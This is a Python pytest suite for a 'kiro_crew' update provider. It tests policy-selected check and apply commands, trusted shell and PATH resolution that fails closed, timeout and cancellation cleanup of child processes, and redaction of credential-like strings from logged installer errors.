"""Tests for kiro_crew.platform.update_provider."""

from __future__ import annotations

import asyncio
import logging
import os
import sys
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from kiro_crew.platform import update_provider
from kiro_crew.platform.governance import UpdatePins
from kiro_crew.platform.update_provider import (
    CommandProvider,
    UpdateCheckResult,
    UpdateProvider,
    _current_platform_key,
    _kill_and_reap,
    _shell_exec_args,
    _trusted_path_env,
    resolve_provider,
)


class TestUpdateCheckResult:
    def test_defaults(self) -> None:
        r = UpdateCheckResult()
        assert r.available is False
        assert r.remote_version == ""
        assert r.error == ""

    def test_available(self) -> None:
        r = UpdateCheckResult(available=True, remote_version="1.2.3")
        assert r.available is True
        assert r.remote_version == "1.2.3"

    def test_error(self) -> None:
        r = UpdateCheckResult(error="network timeout")
        assert r.available is False
        assert r.error == "network timeout"

    def test_frozen(self) -> None:
        r = UpdateCheckResult()
        with pytest.raises(Exception):
            r.available = True  # type: ignore[misc]


class TestProtocol:
    def test_command_is_provider(self) -> None:
        assert isinstance(CommandProvider(), UpdateProvider)


#: Tests that EXECUTE a generated command need a real POSIX shell: on Windows
#: ``_shell_exec_args`` returns None by design (the command lane is refused there
#: because the child's lookup cannot be made trustworthy), so anything asserting
#: on the argv it builds cannot run. String-shape and mock-based assertions in
#: the same classes deliberately keep running on Windows.
_needs_posix_shell = pytest.mark.skipif(
    sys.platform == "win32",
    reason="executes a generated command; _shell_exec_args refuses on Windows by design",
)


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="the command provider lane is POSIX-only by design: _shell_exec_args "
    "refuses on Windows because the child's command lookup cannot be made "
    "trustworthy there (no trusted PATH to substitute, and cmd.exe searches CWD)",
)
class TestCommandProvider:
    @pytest.mark.asyncio
    async def test_check_no_command(self) -> None:
        p = CommandProvider(check_command="", apply_command="echo ok")
        result = await p.check()
        assert result.error == "no check_command configured"

    @pytest.mark.asyncio
    async def test_check_returns_version(self) -> None:
        p = CommandProvider(check_command="echo 2.0.0", apply_command="echo ok")
        result = await p.check()
        assert result.available is True
        assert result.remote_version == "2.0.0"

    @pytest.mark.asyncio
    async def test_check_no_update(self) -> None:
        p = CommandProvider(check_command="exit 1", apply_command="echo ok")
        result = await p.check()
        assert result.available is False
        assert result.error == ""

    @pytest.mark.asyncio
    async def test_check_empty_version_is_error(self) -> None:
        # An exit-0 check that prints NO version is a broken command, not an
        # available update: returning available=True with an empty version would
        # make apply() run and restart to the SAME version forever. The provider
        # fails the check (error set, available False) instead.
        p = CommandProvider(check_command="true", apply_command="echo ok")
        result = await p.check()
        assert result.available is False
        assert result.error != ""

    @pytest.mark.asyncio
    async def test_apply_success(self) -> None:
        p = CommandProvider(check_command="echo 2.0.0", apply_command="echo done")
        success = await p.apply()
        assert success is True

    @pytest.mark.asyncio
    async def test_apply_failure(self) -> None:
        p = CommandProvider(check_command="echo 2.0.0", apply_command="exit 1")
        success = await p.apply()
        assert success is False

    @pytest.mark.asyncio
    async def test_apply_no_command(self) -> None:
        p = CommandProvider(check_command="echo 2.0.0", apply_command="")
        success = await p.apply()
        assert success is False

    @pytest.mark.asyncio
    async def test_check_version_truncated(self) -> None:
        # Long output is truncated to 128 chars
        long_version = "x" * 200
        p = CommandProvider(check_command=f"echo {long_version}", apply_command="echo ok")
        result = await p.check()
        assert result.available is True
        assert len(result.remote_version) <= 128


class TestResolveProvider:
    """The seam is policy-only and selection is by PRESENCE of commands.

    resolve_provider() returns a CommandProvider carrying the policy's commands
    when the active pins define a check_command or apply_command, and None
    otherwise (the ungoverned default — the gateway keeps its built-in update
    behaviour). There is no mechanism enum and no config/env path into the seam.
    """

    def test_no_commands_returns_none(self) -> None:
        """Empty pins (no commands) → None."""
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(),
        ):
            assert resolve_provider() is None

    def test_commands_present_creates_command_provider(self) -> None:
        """Policy pins carrying commands → CommandProvider with them."""
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(
                check_command="/opt/check.sh",
                apply_command="/opt/apply.sh",
            ),
        ):
            provider = resolve_provider()
            assert isinstance(provider, CommandProvider)
            assert provider.check_command == "/opt/check.sh"
            assert provider.apply_command == "/opt/apply.sh"

    def test_check_command_only_creates_provider(self) -> None:
        """Presence of just a check_command is enough to select the provider."""
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(check_command="/opt/check.sh"),
        ):
            provider = resolve_provider()
            assert isinstance(provider, CommandProvider)
            assert provider.check_command == "/opt/check.sh"
            assert provider.apply_command == ""

    def test_apply_command_only_creates_provider(self) -> None:
        """Presence of just an apply_command is enough to select the provider."""
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(apply_command="/opt/apply.sh"),
        ):
            provider = resolve_provider()
            assert isinstance(provider, CommandProvider)
            assert provider.check_command == ""
            assert provider.apply_command == "/opt/apply.sh"

    def test_platform_only_policy_is_still_a_provider(self) -> None:
        """A policy may define commands ONLY per platform. Returning None there
        would silently fall through to the built-in updater and bypass the
        administrator-selected package manager."""
        key = _current_platform_key()
        pins = UpdatePins(platform_commands={key: {"check_command": "c", "apply_command": "a"}})
        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
            provider = resolve_provider()
        assert isinstance(provider, CommandProvider)
        assert provider._resolve_command("check_command") == "c"

    def test_platform_only_policy_for_another_platform_still_provider(self) -> None:
        """Presence is policy-wide, not host-specific: a policy naming only other
        platforms must NOT fall through to the built-in updater. The provider is
        returned and refuses on this host instead."""
        pins = UpdatePins(platform_commands={"some-other-platform": {"apply_command": "a"}})
        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
            provider = resolve_provider()
        assert isinstance(provider, CommandProvider)
        assert provider._resolve_command("check_command") == ""

    def test_empty_platform_entry_is_not_presence(self) -> None:
        """A platform key carrying no commands is not a configured provider."""
        pins = UpdatePins(platform_commands={"linux-x86_64": {}})
        with patch("kiro_crew.platform.governance.active_update_pins", return_value=pins):
            assert resolve_provider() is None

    def test_platform_commands_passed_through(self) -> None:
        """policy platform_commands are carried onto the CommandProvider, and the
        resolved provider picks the right one for the current platform."""
        current_key = _current_platform_key()
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            return_value=UpdatePins(
                check_command="/opt/check.sh",
                apply_command="/opt/apply.sh",
                platform_commands={
                    current_key: {"apply_command": "/opt/apply-native.sh"},
                },
            ),
        ):
            provider = resolve_provider()
            assert isinstance(provider, CommandProvider)
            assert provider.platform_commands == {
                current_key: {"apply_command": "/opt/apply-native.sh"},
            }
            # _resolve_command uses the platform override for apply, default for check
            assert provider._resolve_command("apply_command") == "/opt/apply-native.sh"
            assert provider._resolve_command("check_command") == "/opt/check.sh"

    def test_reading_pins_fails_returns_none(self) -> None:
        """If reading the policy pins raises, resolve_provider fails closed to
        None (the gateway keeps its built-in behaviour)."""
        with patch(
            "kiro_crew.platform.governance.active_update_pins",
            side_effect=RuntimeError("policy unreadable"),
        ):
            assert resolve_provider() is None


class TestPlatformHelpers:
    """Test _current_platform_key and _shell_exec_args."""

    def test_platform_key_format(self) -> None:
        key = _current_platform_key()
        parts = key.split("-")
        assert len(parts) == 2
        assert parts[0] == sys.platform

    def test_platform_key_normalized_machine(self) -> None:
        with patch("platform.machine", return_value="x86_64"):
            key = _current_platform_key()
            assert key.endswith("-x86_64")

    def test_platform_key_amd64_normalized(self) -> None:
        with patch("platform.machine", return_value="AMD64"):
            key = _current_platform_key()
            assert key.endswith("-x86_64")

    def test_platform_key_aarch64_normalized(self) -> None:
        with patch("platform.machine", return_value="aarch64"):
            key = _current_platform_key()
            assert key.endswith("-arm64")

    def test_platform_key_arm64(self) -> None:
        with patch("platform.machine", return_value="arm64"):
            key = _current_platform_key()
            assert key.endswith("-arm64")

    def test_platform_key_unknown_passthrough(self) -> None:
        with patch("platform.machine", return_value="riscv64"):
            key = _current_platform_key()
            assert key.endswith("-riscv64")

    def test_shell_exec_args_posix(self) -> None:
        # Shell is resolved via trusted_system_bin; patch it to a known path so
        # the test does not depend on the host's actual /bin/sh location.
        with patch.object(sys, "platform", "linux"):
            with patch(
                "kiro_crew.platform.update_provider.trusted_system_bin",
                return_value="/bin/sh",
            ):
                args = _shell_exec_args("my-updater check")
                assert args == ["/bin/sh", "-c", "my-updater check"]

    def test_shell_exec_args_posix_fallback(self) -> None:
        # When the trusted lookup misses, fail CLOSED (return None) rather than
        # falling back to a bare name — the bare name is the agent-writable-PATH
        # hole this resolution exists to close.
        with patch.object(sys, "platform", "linux"):
            with patch(
                "kiro_crew.platform.update_provider.trusted_system_bin",
                return_value=None,
            ):
                assert _shell_exec_args("my-updater check") is None

    def test_shell_exec_args_windows_refused(self) -> None:
        # Windows is refused outright: there is no trusted PATH to substitute
        # there and cmd.exe resolves a bare command word from the CWD first, so
        # the child's lookup stays agent-influenceable. Fail closed.
        with patch.object(sys, "platform", "win32"):
            with patch(
                "kiro_crew.platform.update_provider.trusted_system_bin",
                return_value="C:\\Windows\\System32\\cmd.exe",
            ):
                assert _shell_exec_args("my-updater check") is None


class TestCommandProviderPlatformOverrides:
    """Test platform_commands resolution in CommandProvider."""

    @pytest.mark.asyncio
    async def test_platform_override_apply(self) -> None:
        """Platform-specific apply_command overrides the default."""
        current_key = _current_platform_key()
        p = CommandProvider(
            check_command="echo 2.0.0",
            apply_command="echo default-apply",
            platform_commands={
                current_key: {"apply_command": "echo platform-apply"},
            },
        )
        # The resolved command uses the platform override
        assert p._resolve_command("apply_command") == "echo platform-apply"

    @pytest.mark.asyncio
    async def test_platform_override_check(self) -> None:
        """Platform-specific check_command overrides the default."""
        current_key = _current_platform_key()
        p = CommandProvider(
            check_command="echo default-check",
            apply_command="echo apply",
            platform_commands={
                current_key: {"check_command": "echo platform-check"},
            },
        )
        assert p._resolve_command("check_command") == "echo platform-check"

    def test_no_override_falls_back_to_default(self) -> None:
        """When platform key doesn't match, default command is used."""
        p = CommandProvider(
            check_command="echo default",
            apply_command="echo apply-default",
            platform_commands={
                "fake-platform-key": {"apply_command": "echo other"},
            },
        )
        assert p._resolve_command("apply_command") == "echo apply-default"
        assert p._resolve_command("check_command") == "echo default"

    def test_partial_override_only_overrides_specified_field(self) -> None:
        """Only the field specified in the override is replaced."""
        current_key = _current_platform_key()
        p = CommandProvider(
            check_command="echo default-check",
            apply_command="echo default-apply",
            platform_commands={
                current_key: {"apply_command": "echo platform-apply"},
            },
        )
        # check_command falls back to default since not overridden
        assert p._resolve_command("check_command") == "echo default-check"
        assert p._resolve_command("apply_command") == "echo platform-apply"

    @pytest.mark.skipif(
        sys.platform == "win32",
        reason="runs a real command through the shell; the command lane is "
        "POSIX-only by design (see _shell_exec_args)",
    )
    @pytest.mark.asyncio
    async def test_platform_override_actually_runs(self) -> None:
        """Integration: platform override is actually executed."""
        current_key = _current_platform_key()
        p = CommandProvider(
            check_command="echo default-version",
            apply_command="echo default-apply",
            platform_commands={
                current_key: {"check_command": "echo 3.0.0-platform"},
            },
        )
        result = await p.check()
        assert result.available is True
        assert result.remote_version == "3.0.0-platform"


class TestUpdatePinsCommandFields:
    """UpdatePins.from_dict parsing of command fields (governance)."""

    def test_from_dict_command_fields(self) -> None:
        pins = UpdatePins.from_dict(
            {
                "check_command": "/opt/check.sh",
                "apply_command": "/opt/apply.sh",
            }
        )
        assert pins.check_command == "/opt/check.sh"
        assert pins.apply_command == "/opt/apply.sh"
        assert pins.platform_commands == {}

    def test_from_dict_command_defaults_empty(self) -> None:
        pins = UpdatePins.from_dict({})
        assert pins.check_command == ""
        assert pins.apply_command == ""
        assert pins.platform_commands == {}

    def test_from_dict_platform_commands(self) -> None:
        pins = UpdatePins.from_dict(
            {
                "check_command": "/opt/check.sh",
                "apply_command": "/opt/apply.sh",
                "platform_commands": {
                    "linux-x86_64": {
                        "check_command": "/opt/check-x64.sh",
                        "apply_command": "/opt/apply-x64.sh",
                    },
                    "darwin-arm64": {"apply_command": "/opt/apply-arm64.sh"},
                },
            }
        )
        assert pins.platform_commands == {
            "linux-x86_64": {
                "check_command": "/opt/check-x64.sh",
                "apply_command": "/opt/apply-x64.sh",
            },
            "darwin-arm64": {"apply_command": "/opt/apply-arm64.sh"},
        }

    def test_from_dict_command_non_string_raises(self) -> None:
        from kiro_crew.platform.governance import PlatformCompositionError

        with pytest.raises(PlatformCompositionError, match="must be a string"):
            UpdatePins.from_dict({"check_command": 123})

    def test_from_dict_platform_commands_not_mapping_raises(self) -> None:
        from kiro_crew.platform.governance import PlatformCompositionError

        with pytest.raises(PlatformCompositionError, match="must be a mapping"):
            UpdatePins.from_dict({"platform_commands": "nope"})

    def test_from_dict_platform_commands_unknown_key_raises(self) -> None:
        from kiro_crew.platform.governance import PlatformCompositionError

        with pytest.raises(PlatformCompositionError, match="unknown key"):
            UpdatePins.from_dict(
                {
                    "platform_commands": {
                        "linux-x86_64": {"bogus_command": "/opt/x.sh"},
                    },
                }
            )

    def test_from_dict_platform_commands_non_string_value_raises(self) -> None:
        from kiro_crew.platform.governance import PlatformCompositionError

        with pytest.raises(PlatformCompositionError, match="must be a string"):
            UpdatePins.from_dict(
                {
                    "platform_commands": {
                        "linux-x86_64": {"apply_command": 42},
                    },
                }
            )


# ---------------------------------------------------------------------------
# Helpers for mocking asyncio subprocesses
# ---------------------------------------------------------------------------


def _stream(data: bytes) -> asyncio.StreamReader:
    """A real StreamReader at EOF, so bounded reads behave as in production."""
    reader = asyncio.StreamReader()
    reader.feed_data(data)
    reader.feed_eof()
    return reader


def _fake_proc(returncode: int = 0, stdout: bytes = b"", stderr: bytes = b"") -> "MagicMock":
    """Build a mock subprocess the production code can actually read.

    ``_read_bounded_output`` drains ``proc.stdout``/``proc.stderr`` itself rather
    than calling ``communicate()``, so the streams must be real readers; a bare
    MagicMock attribute is not awaitable. ``communicate`` is still stubbed for
    the cleanup paths that call it.
    """
    proc = MagicMock()
    proc.returncode = returncode
    proc.stdout = _stream(stdout)
    proc.stderr = _stream(stderr)
    proc.communicate = AsyncMock(return_value=(stdout, stderr))
    proc.wait = AsyncMock(return_value=returncode)
    proc.kill = MagicMock()
    proc.pid = 4242
    return proc


class TestCommandProviderNoShellAndTimeout:
    """CommandProvider fail-closed shell + timeout + stderr redaction."""

    @pytest.mark.asyncio
    async def test_check_no_trusted_shell(self) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="echo ok")
        with patch(
            "kiro_crew.platform.update_provider._shell_exec_args",
            return_value=None,
        ):
            result = await p.check()
        assert result.error == "no trusted shell found"

    @pytest.mark.asyncio
    async def test_apply_no_trusted_shell(self) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="echo ok")
        with patch(
            "kiro_crew.platform.update_provider._shell_exec_args",
            return_value=None,
        ):
            assert await p.apply() is False

    @pytest.mark.asyncio
    async def test_check_timeout_kills_proc(self) -> None:
        p = CommandProvider(check_command="sleep 100", apply_command="echo ok")
        proc = _fake_proc(returncode=0)
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "sleep 100"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())),
        ):
            result = await p.check()
        assert result.error == "check_command timed out"
        proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_check_file_not_found(self) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="echo ok")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "echo hi"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=FileNotFoundError()),
            ),
            patch.object(sys, "platform", "linux"),
        ):
            result = await p.check()
        # Any spawn failure becomes an error verdict; the message no longer
        # names the shell because OSError covers more than "missing binary".
        assert result.error and result.available is False

    @pytest.mark.asyncio
    async def test_apply_timeout_kills_proc(self) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="sleep 100")
        proc = _fake_proc(returncode=0)
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "sleep 100"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.TimeoutError())),
        ):
            assert await p.apply() is False
        proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_apply_file_not_found(self) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="echo ok")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "echo ok"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=FileNotFoundError()),
            ),
            patch.object(sys, "platform", "linux"),
        ):
            assert await p.apply() is False

    # -- stderr redaction goes through the platform context --
    #
    # An installer failure is prime territory for a host-specific credential
    # shape (an internal registry cookie, an SSO token in a fetch URL), and those
    # live in a companion's regexes rather than in the OSS baseline. These assert
    # the OBSERVABLE outcome -- what does and does not reach the log line -- and
    # deliberately not "which redaction function was called": the previous
    # version of this test stubbed the whole ``kiro_crew.security`` module and
    # asserted two specific calls, so it pinned the old spelling rather than the
    # guarantee, and any change of redactor broke it whether or not the log was
    # still safe.

    @staticmethod
    def _install_policy(policy) -> None:
        import dataclasses

        from kiro_crew.config.loader import KiroCrewConfig
        from kiro_crew.platform import PROFILE_ENTERPRISE, build_default_context, set_context

        set_context(
            dataclasses.replace(
                build_default_context(KiroCrewConfig(), profile=PROFILE_ENTERPRISE),
                credentials=policy,
            )
        )

    async def _apply_with_stderr(self, stderr: bytes) -> None:
        p = CommandProvider(check_command="echo hi", apply_command="fail")
        proc = _fake_proc(returncode=1, stderr=stderr)
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "fail"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
        ):
            assert await p.apply() is False

    @pytest.mark.asyncio
    async def test_apply_failure_scrubs_stderr_through_the_context(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        from kiro_crew import security
        from kiro_crew.platform import reset_context

        class _Policy:
            def redact(self, text: str) -> str:
                return security.redact(text).replace("SSO-COOKIE", "[REDACTED-SSO]")

        self._install_policy(_Policy())
        try:
            with caplog.at_level(logging.ERROR):
                await self._apply_with_stderr(
                    b"fetch rejected SSO-COOKIE=abc123 key=AKIAIOSFODNN7EXAMPLE"
                )
        finally:
            reset_context()
        logged = "\n".join(r.getMessage() for r in caplog.records)
        assert "CommandProvider.apply: failed" in logged
        # The companion's extra reach -- the whole point of routing via context.
        assert "SSO-COOKIE" not in logged
        # ...without losing the baseline pass underneath it.
        assert "AKIAIOSFODNN7EXAMPLE" not in logged

    @pytest.mark.asyncio
    async def test_apply_failure_withholds_stderr_when_composition_fails(
        self, caplog: pytest.LogCaptureFixture
    ) -> None:
        """A host that cannot compose its companion still reports the failure.

        ``apply()`` must return False and log the return code -- the operator's
        actionable part -- with only the untrusted stderr text withheld.
        """
        from kiro_crew.platform import PlatformCompositionError, reset_context
        from kiro_crew.platform.context import LOG_WITHHELD_PLACEHOLDER

        class _Unprovable:
            def redact(self, text: str) -> str:
                raise PlatformCompositionError("companion could not be composed")

        self._install_policy(_Unprovable())
        try:
            with caplog.at_level(logging.ERROR):
                await self._apply_with_stderr(b"fetch rejected token=secret123")
        finally:
            reset_context()
        logged = "\n".join(r.getMessage() for r in caplog.records)
        assert "rc=1" in logged
        assert LOG_WITHHELD_PLACEHOLDER in logged
        assert "secret123" not in logged


class TestCancellationKillsUpdaterChild:
    """A gateway shutdown cancels the update task. The updater child must be
    killed and reaped, not left mutating the installation after we are gone.

    Every test here stubs BOTH ``_shell_exec_args`` AND ``trusted_system_path``
    so the command lane runs identically on every host (POSIX and Windows
    runners): the seams are what make it platform-dependent, so neutralising
    both keeps these tests about the cancellation/reap semantics only.
    """

    @staticmethod
    def _proc():
        proc = MagicMock()
        proc.returncode = 0
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.stdout = _stream(b"")
        proc.stderr = _stream(b"")
        proc.wait = AsyncMock(return_value=proc.returncode)
        proc.kill = MagicMock()
        return proc

    @pytest.mark.asyncio
    async def test_command_apply_cancelled_kills_child(self) -> None:
        proc = self._proc()
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.CancelledError())),
        ):
            with pytest.raises(asyncio.CancelledError):
                await p.apply()
        proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_command_check_cancelled_kills_child(self) -> None:
        proc = self._proc()
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "c"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", AsyncMock(return_value=proc)),
            patch("asyncio.wait_for", AsyncMock(side_effect=asyncio.CancelledError())),
        ):
            with pytest.raises(asyncio.CancelledError):
                await p.check()
        proc.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_apply_runs_outside_any_writable_checkout(self) -> None:
        """A relative command word must not resolve in the gateway's cwd."""
        proc = MagicMock()
        proc.returncode = 0
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.stdout = _stream(b"")
        proc.stderr = _stream(b"")
        proc.wait = AsyncMock(return_value=proc.returncode)
        spawn = AsyncMock(return_value=proc)
        p = CommandProvider(check_command="c", apply_command="./update.sh")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "./update.sh"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch("asyncio.create_subprocess_exec", spawn),
        ):
            assert await p.apply() is True
        assert spawn.await_args.kwargs["cwd"] == "/"

    @pytest.mark.asyncio
    async def test_kill_and_reap_kills_the_whole_tree(self) -> None:
        """An update command is a shell pipeline, so killing only the direct
        child leaves its members running and can leave communicate() waiting on
        pipes those survivors hold."""
        proc = MagicMock()
        proc.pid = 4242
        proc.kill = MagicMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.stdout = _stream(b"")
        proc.stderr = _stream(b"")
        proc.wait = AsyncMock(return_value=proc.returncode)
        with patch("kiro_crew.platform_compat.kill_process_tree_async", AsyncMock()) as tree:
            await _kill_and_reap(proc)
        tree.assert_awaited_once()
        assert tree.await_args.args[0] == 4242

    @pytest.mark.asyncio
    async def test_kill_and_reap_bounds_the_reap(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """A descendant ignoring the signal must not turn cleanup into a hang."""
        # The ceiling this test drives to expiry is a real wait, so state the
        # production bound directly instead of spending it: cleanup runs on the
        # gateway's shutdown path, and a ceiling on the far side of the outer
        # bound below would be a hang rather than a bounded reap.
        assert 0 < update_provider._REAP_TIMEOUT_SECS <= 30
        monkeypatch.setattr(update_provider, "_REAP_TIMEOUT_SECS", 0.01)
        proc = MagicMock()
        proc.pid = 1
        proc.kill = MagicMock()

        async def _never_returns():
            await asyncio.sleep(3600)

        proc.communicate = _never_returns
        with patch("kiro_crew.platform_compat.kill_process_tree_async", AsyncMock()):
            await asyncio.wait_for(_kill_and_reap(proc), timeout=30)

    @pytest.mark.asyncio
    async def test_kill_and_reap_tolerates_dead_child(self) -> None:
        """Reaping is best-effort: a child that already exited must not raise."""
        proc = MagicMock()
        proc.kill = MagicMock(side_effect=ProcessLookupError())
        proc.communicate = AsyncMock(side_effect=RuntimeError("already reaped"))
        await _kill_and_reap(proc)

    @pytest.mark.asyncio
    async def test_cancel_during_spawn_propagates_cancellation(self) -> None:
        """Cancellation landing INSIDE create_subprocess_exec leaves no child and
        no bound name: the handler must re-raise CancelledError, not trip over an
        unbound local and replace it with UnboundLocalError."""
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=asyncio.CancelledError()),
            ),
        ):
            with pytest.raises(asyncio.CancelledError):
                await p.apply()

    @pytest.mark.asyncio
    async def test_check_cancel_during_spawn_propagates_cancellation(self) -> None:
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "c"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "asyncio.create_subprocess_exec",
                AsyncMock(side_effect=asyncio.CancelledError()),
            ),
        ):
            with pytest.raises(asyncio.CancelledError):
                await p.check()


class TestCommandProviderTrustedPath:
    """The child must not resolve the operator's command words through a PATH
    that can lead with an agent-writable directory."""

    def test_trusted_path_env_replaces_path_only(self) -> None:
        with (
            patch.dict(os.environ, {"PATH": "/home/u/.local/bin:/usr/bin", "LANG": "C"}),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
        ):
            env = _trusted_path_env()
        assert env is not None
        assert env["PATH"] == "/usr/bin:/bin"
        # Everything else survives, so a package manager keeps its proxy/locale.
        assert env["LANG"] == "C"

    def test_trusted_path_env_fails_closed_when_unavailable(self) -> None:
        # No trusted PATH to substitute: refuse rather than pass the inherited
        # (agent-influenceable) PATH through to the child.
        with (
            patch.dict(os.environ, {"PATH": "/orig"}),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value=None,
            ),
        ):
            assert _trusted_path_env() is None

    @pytest.mark.asyncio
    async def test_apply_refuses_without_trusted_path(self) -> None:
        spawn = AsyncMock()
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "kiro_crew.platform.update_provider._trusted_path_env",
                return_value=None,
            ),
            patch("asyncio.create_subprocess_exec", spawn),
        ):
            assert await p.apply() is False
        spawn.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_check_refuses_without_trusted_path(self) -> None:
        spawn = AsyncMock()
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "c"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "kiro_crew.platform.update_provider._trusted_path_env",
                return_value=None,
            ),
            patch("asyncio.create_subprocess_exec", spawn),
        ):
            assert (await p.check()).error
        spawn.assert_not_awaited()

    @pytest.mark.asyncio
    async def test_apply_passes_trusted_env(self) -> None:
        proc = MagicMock()
        proc.returncode = 0
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.stdout = _stream(b"")
        proc.stderr = _stream(b"")
        proc.wait = AsyncMock(return_value=proc.returncode)
        spawn = AsyncMock(return_value=proc)
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "a"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "kiro_crew.platform.update_provider._trusted_path_env",
                return_value={"PATH": "/usr/bin:/bin"},
            ),
            patch("asyncio.create_subprocess_exec", spawn),
        ):
            assert await p.apply() is True
        assert spawn.await_args.kwargs["env"] == {"PATH": "/usr/bin:/bin"}

    @pytest.mark.asyncio
    async def test_check_passes_trusted_env(self) -> None:
        proc = MagicMock()
        proc.returncode = 0
        proc.communicate = AsyncMock(return_value=(b"9.9.9", b""))
        proc.stdout = _stream(b"9.9.9")
        proc.stderr = _stream(b"")
        proc.wait = AsyncMock(return_value=proc.returncode)
        spawn = AsyncMock(return_value=proc)
        p = CommandProvider(check_command="c", apply_command="a")
        with (
            patch(
                "kiro_crew.platform.update_provider._shell_exec_args",
                return_value=["/bin/sh", "-c", "c"],
            ),
            patch(
                "kiro_crew.platform.update_provider.trusted_system_path",
                return_value="/usr/bin:/bin",
            ),
            patch(
                "kiro_crew.platform.update_provider._trusted_path_env",
                return_value={"PATH": "/usr/bin:/bin"},
            ),
            patch("asyncio.create_subprocess_exec", spawn),
        ):
            assert (await p.check()).available is True
        assert spawn.await_args.kwargs["env"] == {"PATH": "/usr/bin:/bin"}


class TestManualEntryPointsHonourPolicy:
    """`POST /api/update` and `kirocrew update` must not run the built-in
    git/CDN mechanism on a host whose policy selects its own updater. An
    authenticated operator clicking Update is who they say they are, not proof
    that this host may update by git."""

